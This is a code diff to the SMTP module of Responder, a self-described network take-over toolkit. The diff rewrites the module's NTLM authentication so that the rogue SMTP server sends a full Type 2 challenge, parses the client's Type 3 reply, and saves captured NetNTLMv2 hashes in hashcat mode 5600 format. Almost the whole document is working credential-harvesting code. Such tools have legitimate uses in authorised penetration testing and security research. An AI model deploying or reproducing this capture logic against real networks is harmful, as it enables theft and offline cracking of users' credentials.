@@ -2,6 +2,7 @@
 # This file is part of Responder, a network take-over set of tools 
 # created and maintained by Laurent Gaffie.
 # email: lgaffie@secorizon.com
+# Enhanced SMTP server with multiple authentication methods
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
 # the Free Software Foundation, either version 3 of the License, or
@@ -28,7 +29,7 @@ else:
 from packets import SMTPGreeting, SMTPAUTH, SMTPAUTH1, SMTPAUTH2
 
 class ESMTP(BaseRequestHandler):
-	"""SMTP server with multiple authentication methods"""
+	"""Enhanced SMTP server with multiple authentication methods"""
 	
 	def __init__(self, *args, **kwargs):
 		self.challenge = None
@@ -295,8 +296,10 @@ class ESMTP(BaseRequestHandler):
 			return False
 	
 	def handle_auth_ntlm(self, data):
-		"""Handle AUTH NTLM"""
+		"""Handle AUTH NTLM with proper Type 2 challenge"""
 		try:
+			import time
+			
 			# Check for inline NTLM NEGOTIATE
 			auth_match = re.search(b'AUTH NTLM (.+)', data, re.IGNORECASE)
 			
@@ -320,20 +323,11 @@ class ESMTP(BaseRequestHandler):
 			if msg_type != 1:  # Type 1 - NEGOTIATE
 				return False
 			
-			# Generate challenge
-			challenge = RandomChallenge()
-			
-			# Build NTLMSSP CHALLENGE (Type 2)
-			ntlm_challenge = b'NTLMSSP\x00'
-			ntlm_challenge += struct.pack('<I', 2)  # Type 2
-			ntlm_challenge += struct.pack('<HHI', 0, 0, 0)  # Target name
-			ntlm_challenge += struct.pack('<I', 0x00008201)  # Flags
-			ntlm_challenge += challenge  # Server challenge
-			ntlm_challenge += b'\x00' * 8  # Reserved
-			ntlm_challenge += struct.pack('<HHI', 0, 0, 0)  # Target info
+			# Generate Type 2 with proper structure
+			type2_msg = self.generate_ntlm_type2()
+			challenge_b64 = b64encode(type2_msg).decode('latin-1')
 			
 			# Send challenge
-			challenge_b64 = b64encode(ntlm_challenge).decode('latin-1')
 			self.send_continue(challenge_b64)
 			
 			# Receive NTLMSSP AUTH (Type 3)
@@ -344,71 +338,182 @@ class ESMTP(BaseRequestHandler):
 			
 			auth_data = b64decode(auth_b64)
 			
-			# Verify signature
-			if auth_data[0:8] != b'NTLMSSP\x00':
-				return False
+			# Parse Type 3 and extract hash
+			ntlm_hash = self.parse_ntlm_type3(auth_data, type2_msg)
 			
-			msg_type = struct.unpack('<I', auth_data[8:12])[0]
-			if msg_type != 3:  # Type 3 - AUTH
-				return False
+			if ntlm_hash:
+				# Extract username from hash for logging
+				username = ntlm_hash.split('::')[0]
+				
+				SaveToDb({
+					'module': 'SMTP',
+					'type': 'NTLMv2-SSP',
+					'client': self.client_address[0],
+					'user': username,
+					'hash': ntlm_hash,
+					'fullhash': ntlm_hash,
+				})
+				
+				if settings.Config.Verbose:
+					print(color("[*] [SMTP] Captured NTLMv2 hash from %s for user %s" % (
+						self.client_address[0].replace("::ffff:", ""), username), 3, 1))
+				
+				return True
 			
-			# Parse fields
-			lm_len = struct.unpack('<H', auth_data[12:14])[0]
-			lm_offset = struct.unpack('<I', auth_data[16:20])[0]
+			return False
 			
-			ntlm_len = struct.unpack('<H', auth_data[20:22])[0]
-			ntlm_offset = struct.unpack('<I', auth_data[24:28])[0]
-			
-			domain_len = struct.unpack('<H', auth_data[28:30])[0]
-			domain_offset = struct.unpack('<I', auth_data[32:36])[0]
-			
-			user_len = struct.unpack('<H', auth_data[36:38])[0]
-			user_offset = struct.unpack('<I', auth_data[40:44])[0]
-			
-			# Extract data
-			username = auth_data[user_offset:user_offset+user_len].decode('utf-16-le', errors='ignore')
-			domain = auth_data[domain_offset:domain_offset+domain_len].decode('utf-16-le', errors='ignore')
-			lm_hash = auth_data[lm_offset:lm_offset+lm_len]
-			ntlm_hash = auth_data[ntlm_offset:ntlm_offset+ntlm_len]
-			
-			# Determine version
-			if ntlm_len == 24:
-				hash_type = "NTLMv1"
-				hash_string = "%s::%s:%s:%s:%s" % (
-					username, domain,
-					codecs.encode(lm_hash, 'hex').decode('latin-1'),
-					codecs.encode(ntlm_hash, 'hex').decode('latin-1'),
-					codecs.encode(challenge, 'hex').decode('latin-1')
-				)
-			elif ntlm_len > 24:
-				hash_type = "NTLMv2"
-				hash_string = "%s::%s:%s:%s:%s" % (
-					username, domain,
-					codecs.encode(challenge, 'hex').decode('latin-1'),
-					codecs.encode(ntlm_hash[:16], 'hex').decode('latin-1'),
-					codecs.encode(ntlm_hash[16:], 'hex').decode('latin-1')
-				)
-			else:
-				return False
-			
-			SaveToDb({
-				'module': 'SMTP',
-				'type': hash_type + '-SSP',
-				'client': self.client_address[0],
-				'user': domain + '\\' + username,
-				'hash': codecs.encode(ntlm_hash, 'hex').decode('latin-1'),
-				'fullhash': hash_string,
-			})
-			
-			if settings.Config.Verbose:
-				print(color("[*] [SMTP] Captured %s hash from %s for user %s\\%s" % (
-					hash_type, self.client_address[0].replace("::ffff:", ""), domain, username), 3, 1))
-			
-			return True
 		except Exception as e:
 			if settings.Config.Verbose:
 				print(text('[SMTP] Error parsing NTLM: %s' % str(e)))
 			return False
+	
+	def generate_ntlm_type2(self):
+		"""Generate NTLM Type 2 with target info for NTLMv2"""
+		import time
+		
+		# Generate random 8-byte challenge
+		challenge = RandomChallenge()
+		
+		# Target name: "WORKGROUP" (18 bytes in UTF-16LE)
+		target_name = b'WORKGROUP'.decode('ascii').encode('utf-16le')
+		target_name_len = len(target_name)
+		
+		# Build target info (AV pairs) for NTLMv2
+		target_info = b''
+		
+		# MsvAvNbDomainName (0x0002)
+		av_domain = b'WORKGROUP'.decode('ascii').encode('utf-16le')
+		target_info += struct.pack('<HH', 0x0002, len(av_domain)) + av_domain
+		
+		# MsvAvNbComputerName (0x0001)
+		av_computer = b'SERVER'.decode('ascii').encode('utf-16le')
+		target_info += struct.pack('<HH', 0x0001, len(av_computer)) + av_computer
+		
+		# MsvAvDnsDomainName (0x0004)
+		av_dns_domain = b'workgroup'.decode('ascii').encode('utf-16le')
+		target_info += struct.pack('<HH', 0x0004, len(av_dns_domain)) + av_dns_domain
+		
+		# MsvAvDnsComputerName (0x0003)
+		av_dns_computer = b'server'.decode('ascii').encode('utf-16le')
+		target_info += struct.pack('<HH', 0x0003, len(av_dns_computer)) + av_dns_computer
+		
+		# MsvAvTimestamp (0x0007) - 8 bytes FILETIME
+		filetime = int((time.time() + 11644473600) * 10000000)
+		target_info += struct.pack('<HH', 0x0007, 8) + struct.pack('<Q', filetime)
+		
+		# MsvAvEOL (0x0000)
+		target_info += struct.pack('<HH', 0x0000, 0)
+		
+		target_info_len = len(target_info)
+		
+		# Calculate offsets
+		target_name_offset = 48
+		target_info_offset = target_name_offset + target_name_len
+		
+		# Build Type 2 message
+		type2_msg = b'NTLMSSP\x00'  # Signature
+		type2_msg += struct.pack('<I', 2)  # Type 2
+		
+		# Target name (LE format: len, max len, offset)
+		type2_msg += struct.pack('<HHI', target_name_len, target_name_len, target_name_offset)
+		
+		# Flags - use HTTP server flags for compatibility
+		type2_msg += b'\x05\x02\x81\xa2'  # 0xa2810205
+		
+		# Challenge (8 bytes)
+		type2_msg += challenge
+		
+		# Context (8 bytes, reserved)
+		type2_msg += b'\x00' * 8
+		
+		# Target info (LE format: len, max len, offset)
+		type2_msg += struct.pack('<HHI', target_info_len, target_info_len, target_info_offset)
+		
+		# Payload
+		type2_msg += target_name
+		type2_msg += target_info
+		
+		return type2_msg
+	
+	def parse_ntlm_type3(self, type3_msg, type2_msg):
+		"""Parse Type 3 and extract NetNTLMv2 hash"""
+		try:
+			# Verify signature
+			if type3_msg[:8] != b'NTLMSSP\x00':
+				return None
+			
+			# Verify message type
+			msg_type = struct.unpack('<I', type3_msg[8:12])[0]
+			if msg_type != 3:
+				return None
+			
+			# Parse security buffers
+			# LM Response
+			lm_len, lm_maxlen, lm_offset = struct.unpack('<HHI', type3_msg[12:20])
+			
+			# NTLM Response
+			ntlm_len, ntlm_maxlen, ntlm_offset = struct.unpack('<HHI', type3_msg[20:28])
+			
+			# Domain name
+			domain_len, domain_maxlen, domain_offset = struct.unpack('<HHI', type3_msg[28:36])
+			
+			# User name
+			user_len, user_maxlen, user_offset = struct.unpack('<HHI', type3_msg[36:44])
+			
+			# Workstation name
+			ws_len, ws_maxlen, ws_offset = struct.unpack('<HHI', type3_msg[44:52])
+			
+			# Extract strings
+			if user_offset + user_len <= len(type3_msg):
+				user = type3_msg[user_offset:user_offset+user_len].decode('utf-16le', errors='ignore')
+			else:
+				user = ""
+			
+			if domain_offset + domain_len <= len(type3_msg):
+				domain = type3_msg[domain_offset:domain_offset+domain_len].decode('utf-16le', errors='ignore')
+			else:
+				domain = ""
+			
+			# DO NOT parse email addresses - use exact Type 3 fields for hashcat
+			
+			if ws_offset + ws_len <= len(type3_msg):
+				workstation = type3_msg[ws_offset:ws_offset+ws_len].decode('utf-16le', errors='ignore')
+			else:
+				workstation = ""
+			
+			# Extract NTLM response
+			if ntlm_offset + ntlm_len <= len(type3_msg):
+				ntlm_response = type3_msg[ntlm_offset:ntlm_offset+ntlm_len]
+			else:
+				return None
+			
+			# Check if NTLMv2 (response length > 24 bytes)
+			if len(ntlm_response) > 24:
+				# NTLMv2
+				ntlmv2_response = ntlm_response[:16]  # First 16 bytes
+				ntlmv2_blob = ntlm_response[16:]      # Rest is the blob
+				
+				# Extract challenge from Type 2
+				challenge = type2_msg[24:32]  # Challenge is at offset 24
+				
+				# Build hashcat NetNTLMv2 format
+				# Format: username::domain:challenge:ntlmv2_response:blob
+				# For hashcat mode 5600
+				hash_str = "%s::%s:%s:%s:%s" % (
+					user,
+					domain,
+					codecs.encode(challenge, 'hex').decode('latin-1'),
+					codecs.encode(ntlmv2_response, 'hex').decode('latin-1'),
+					codecs.encode(ntlmv2_blob, 'hex').decode('latin-1')
+				)
+				
+				return hash_str
+			
+			# NTLMv1 or unsupported
+			return None
+			
+		except Exception as e:
+			return None
 	
 	def handle(self):
 		try:
